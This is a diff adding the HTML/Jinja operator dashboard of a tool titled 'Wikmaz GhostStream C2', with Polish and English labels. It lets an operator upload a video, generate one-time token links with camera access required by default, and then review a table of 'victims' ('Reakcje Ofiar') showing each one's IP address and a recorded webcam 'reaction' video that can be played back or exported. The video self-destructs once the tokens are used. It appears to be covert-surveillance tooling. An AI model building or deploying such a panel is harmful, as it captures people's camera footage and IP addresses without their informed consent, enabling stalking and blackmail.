@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wikmaz GhostStream C2</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0 0 20px 0; }
+        
+        /* 🛠️ NAPRAWIONY GÓRNY PASEK NAWIGACYJNY */
+        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 30px; background: rgba(0,0,0,0.8); border-bottom: 1px solid #222; box-shadow: 0 4px 15px rgba(0,255,136,0.1); margin-bottom: 30px;}
+        .creator-btn { font-size: 14px; font-weight: bold; cursor: pointer; background: linear-gradient(45deg, #ffaa00, #ff0055); color: white; padding: 8px 20px; border-radius: 20px; border: none; box-shadow: 0 0 10px rgba(255, 0, 85, 0.5); transition: 0.3s;}
+        .creator-btn:hover { transform: scale(1.05); }
+        .lang-switch { font-size: 16px; font-weight: bold; cursor: pointer; color: #555; }
+        .lang-active { color: #00ff88; text-shadow: 0 0 5px #00ff88; }
+
+        .container { display: flex; gap: 20px; max-width: 1400px; margin: 0 auto; flex-wrap: wrap; padding: 0 20px;}
+        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 20px; flex: 1; min-width: 300px; }
+        h2 { border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; color: #00ff88;}
+        input, button, select { padding: 10px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #333; border-radius: 5px; width: 100%; box-sizing: border-box; font-size: 14px;}
+        button { background: #00ff88; color: #000; font-weight: bold; cursor: pointer; }
+        .btn-kill { background: #ff0000; color: #fff; width: auto; padding: 5px 10px; }
+        .btn-play { background: #007bff; color: #fff; width: auto; padding: 5px 15px; }
+        .btn-export { background: #ffaa00; color: #000; width: auto; padding: 5px 15px; margin-left:15px;}
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .badge { padding: 3px 8px; border-radius: 10px; font-size: 12px; color: white;}
+        .active { background: #28a745; } .dead { background: #dc3545; }
+        
+        .creator-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center;}
+        .creator-content { background: rgba(20, 20, 20, 0.95); border: 1px solid #333; border-radius: 15px; padding: 30px; text-align: center; max-width: 400px; box-shadow: 0 0 30px rgba(0,255,136,0.2); }
+        .creator-content h3 { margin-top: 0; color: #00ff88; font-size: 24px;}
+        .link-btn { display: block; width: 100%; padding: 12px; margin: 10px 0; background: #222; color: #fff; text-decoration: none; border-radius: 8px; font-weight: bold; transition: 0.3s; border: 1px solid #444; box-sizing: border-box;}
+        .link-btn:hover { background: #333; border-color: #00ff88; color: #00ff88;}
+        .donate-btn { background: linear-gradient(90deg, #FF5E5B, #FFC107); border: none; color: #000;}
+        .close-creator { margin-top: 20px; background: #444; color: white; }
+    </style>
+</head>
+<body onload="initLang()">
+
+    <!-- 🔥 CZYSTY GÓRNY PASEK NAWIGACYJNY 🔥 -->
+    <div class="top-nav">
+        <button class="creator-btn" onclick="document.getElementById('creatorModal').style.display='flex'">☕ About Author</button>
+        <div class="lang-switch">
+            <span id="btn-pl" onclick="setLang('pl')">PL</span> | <span id="btn-en" onclick="setLang('en')">EN</span>
+        </div>
+    </div>
+
+    <h1 style="text-align: center; color: #00ff88; text-transform: uppercase; margin-top: 0;">👁️ WIKMAZ GHOST_STREAM C2</h1>
+    <div style="text-align: center; margin-bottom: 20px; color: #aaa;"><span class="t-domain">Domena:</span> <span id="globalUrl" style="color:#0f0; font-family:monospace; font-size:16px;">{{ public_url }}</span></div>
+    
+    <!-- RESZTA INTERFEJSU -->
+    <div class="container">
+        <div class="card" style="flex: 1;">
+            <h2 class="t-mission">🔥 Nowa Misja</h2>
+            <form action="/" method="post" enctype="multipart/form-data">
+                <input type="file" name="video" accept="video/mp4" required>
+                <select name="quality">
+                    <option value="mobile" class="t-opt-mob">Tarcza / Mobile (480p, 600 kbps)</option>
+                    <option value="standard" class="t-opt-std">Standard (720p, 1500 kbps)</option>
+                    <option value="source" class="t-opt-src">Oryginał</option>
+                </select>
+                <input type="number" name="token_count" value="1" min="1" required id="ph-tokens" placeholder="Ilość haseł">
+                
+                <div style="color: #ff4444; font-weight: bold; margin: 10px 0;">
+                    <input type="checkbox" name="require_camera" value="1" checked style="width: auto;"> <span class="t-check-cam">Wymagaj dostępu do kamery</span>
+                </div>
+                <div style="color: #ff4444; font-weight: bold; margin: 10px 0;">
+                    <input type="checkbox" name="auto_delete" value="1" checked style="width: auto;"> <span class="t-check-del">Usuń wideo po zużyciu haseł</span>
+                </div>
+                <button type="submit" class="t-btn-gen" onclick="this.innerHTML='Przetwarzanie...';">Generuj Plik i Hasła</button>
+            </form>
+        </div>
+
+        <div class="card" style="flex: 2;">
+            <h2 class="t-base">🔑 Baza Haseł</h2>
+            <table>
+                <tr><th class="t-code">Kod</th><th class="t-opts">Opcje</th><th class="t-stat">Status Pliku</th><th class="t-manage">Zarządzanie</th></tr>
+                {% for t in tokens %}
+                <tr>
+                    <td style="color: #00ff88; font-family: monospace; font-size: 16px;">{{ t.token }}<br><button style="width:auto; padding:3px; background:#444; color:#fff; margin-top:5px;" onclick="copyLink('{{ t.token }}')" class="t-copy">📋 Kopiuj</button></td>
+                    <td>
+                        <span class="badge {% if t.used %}dead{% else %}active{% endif %}">{% if t.used %}SPALONE{% else %}GOTOWE{% endif %}</span><br>
+                        {% if t.require_camera %}<span style="color:#ff8800; font-weight:bold; font-size:12px;">📸 KAMERA: TAK</span>{% else %}<span style="color:#888; font-size:12px;">KAMERA: NIE</span>{% endif %}
+                    </td>
+                    <td>
+                        {% for v in videos %}{% if v.id == t.video_id %}
+                            <span class="badge {% if 'Zniszczony' in v.status %}dead{% else %}active{% endif %}">{{ v.status }}</span><br>
+                            {% if 'Aktywny' in v.status %}<form action="/kill/{{ v.id }}" method="post" style="margin-top:5px;"><button type="submit" class="btn-kill t-destroy">💀 Zniszcz</button></form>{% endif %}
+                        {% endif %}{% endfor %}
+                    </td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+    </div>
+    
+    <div class="container" style="margin-top: 20px;">
+        <div class="card" style="flex: 100%;">
+            <h2><span class="t-reac">📊 Reakcje Ofiar (Kino)</span><button class="btn-export t-backup" onclick="window.open('/export_data', '_blank')">💾 Pobierz Backup (JSON)</button></h2>
+            <table>
+                <tr><th>Data</th><th>Token</th><th>IP</th><th class="t-action">Akcja</th></tr>
+                {% for s in stats %}
+                <tr>
+                    <td>{{ s.timestamp }}</td><td style="color:#00ff88;">{{ s.token }}</td><td>{{ s.ip }}</td>
+                    <td><button class="btn-play t-play" onclick="openTheater('{{ s.reaction_file }}')">▶ Odtwórz</button></td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+    </div>
+
+    <!-- WIKMAZ CREATOR MODAL -->
+    <div id="creatorModal" class="creator-modal">
+        <div class="creator-content">
+            <h3>WIKMAZ GHOSTSTREAM C2</h3>
+            <p style="color: #aaa; font-size: 14px;">Zaprojektowane i zakodowane przez <b>Wikmaz</b>.<br>Wspieraj rozwój niezależnych narzędzi!</p>
+            
+            <a href="https://ko-fi.com/wikmaz" target="_blank" class="link-btn donate-btn">☕ Buy me a coffee (Ko-fi)</a>
+            <a href="https://suppi.pl/wikmaz" target="_blank" class="link-btn donate-btn">🍕 Wsparcie (Suppi)</a>
+            
+            <a href="https://github.com/wikmaz-pl" target="_blank" class="link-btn">💻 GitHub</a>
+            <a href="https://www.youtube.com/@Wikmazpl" target="_blank" class="link-btn">🎥 YouTube</a>
+            <a href="https://wikmaz.pl" target="_blank" class="link-btn">🌐 Strona WWW</a>
+            
+            <p style="margin-top: 15px; font-size: 12px; color: #888;">Kontakt: admin@softhause.wikmaz.pl</p>
+            <button class="close-creator" onclick="document.getElementById('creatorModal').style.display='none'">Zamknij / Close</button>
+        </div>
+    </div>
+
+    <div id="theaterModal" class="creator-modal">
+        <video id="theaterVideo" controls autoplay style="max-width:80%; max-height:80%; border:3px solid #00ff88; border-radius:10px;"></video>
+        <button class="close-creator" onclick="closeTheater()" style="width: 200px; margin-top:20px; background:red;">✖ Zamknij Kino</button>
+    </div>
+
+    <script>
+        const dict = {
+            pl: { domain: "Domena:", mission: "🔥 Nowa Misja", optMob: "Tarcza / Mobile (480p, 600 kbps)", optStd: "Standard (720p, 1500 kbps)", optSrc: "Oryginał", phTokens: "Ilość haseł", checkCam: "Wymagaj dostępu do kamery", checkDel: "Usuń wideo po zużyciu haseł", btnGen: "Generuj Plik i Hasła", base: "🔑 Baza Haseł", code: "Kod", opts: "Opcje", stat: "Status Pliku", manage: "Zarządzanie", copy: "📋 Kopiuj", destroy: "💀 Zniszcz", reac: "📊 Reakcje Ofiar (Kino)", backup: "💾 Pobierz Backup (JSON)", action: "Akcja", play: "▶ Odtwórz" },
+            en: { domain: "Domain:", mission: "🔥 New Mission", optMob: "Shield / Mobile (480p, 600 kbps)", optStd: "Standard (720p, 1500 kbps)", optSrc: "Original Source", phTokens: "Token count", checkCam: "Require Camera Access", checkDel: "Delete video when tokens depleted", btnGen: "Generate File & Tokens", base: "🔑 Tokens Database", code: "Code", opts: "Options", stat: "File Status", manage: "Management", copy: "📋 Copy", destroy: "💀 Destroy", reac: "📊 Target Reactions (Theater)", backup: "💾 Download Backup (JSON)", action: "Action", play: "▶ Play" }
+        };
+        function setLang(lang) {
+            document.querySelectorAll('.t-domain').forEach(e => e.innerText = dict[lang].domain); document.querySelectorAll('.t-mission').forEach(e => e.innerText = dict[lang].mission); document.querySelectorAll('.t-opt-mob').forEach(e => e.innerText = dict[lang].optMob); document.querySelectorAll('.t-opt-std').forEach(e => e.innerText = dict[lang].optStd); document.querySelectorAll('.t-opt-src').forEach(e => e.innerText = dict[lang].optSrc); document.getElementById('ph-tokens').placeholder = dict[lang].phTokens; document.querySelectorAll('.t-check-cam').forEach(e => e.innerText = dict[lang].checkCam); document.querySelectorAll('.t-check-del').forEach(e => e.innerText = dict[lang].checkDel); document.querySelectorAll('.t-btn-gen').forEach(e => e.innerText = dict[lang].btnGen); document.querySelectorAll('.t-base').forEach(e => e.innerText = dict[lang].base); document.querySelectorAll('.t-code').forEach(e => e.innerText = dict[lang].code); document.querySelectorAll('.t-opts').forEach(e => e.innerText = dict[lang].opts); document.querySelectorAll('.t-stat').forEach(e => e.innerText = dict[lang].stat); document.querySelectorAll('.t-manage').forEach(e => e.innerText = dict[lang].manage); document.querySelectorAll('.t-copy').forEach(e => e.innerText = dict[lang].copy); document.querySelectorAll('.t-destroy').forEach(e => e.innerText = dict[lang].destroy); document.querySelectorAll('.t-reac').forEach(e => e.innerText = dict[lang].reac); document.querySelectorAll('.t-backup').forEach(e => e.innerText = dict[lang].backup); document.querySelectorAll('.t-action').forEach(e => e.innerText = dict[lang].action); document.querySelectorAll('.t-play').forEach(e => e.innerText = dict[lang].play);
+            document.getElementById('btn-pl').className = lang === 'pl' ? 'lang-active' : ''; document.getElementById('btn-en').className = lang === 'en' ? 'lang-active' : '';
+        }
+        function initLang() { const userLang = navigator.language || navigator.userLanguage; setLang(userLang.startsWith('pl') ? 'pl' : 'en'); }
+        function copyLink(token) { const u = document.getElementById('globalUrl').innerText; if(u.includes("Brak")) return alert("Wait for tunnel."); navigator.clipboard.writeText(u + "/?t=" + token); }
+        function openTheater(filename) { document.getElementById('theaterVideo').src = "/play_reaction/" + filename; document.getElementById('theaterModal').style.display = "flex"; }
+        function closeTheater() { document.getElementById('theaterVideo').pause(); document.getElementById('theaterVideo').src = ""; document.getElementById('theaterModal').style.display = "none"; }
+    </script>
+</body>
+</html>
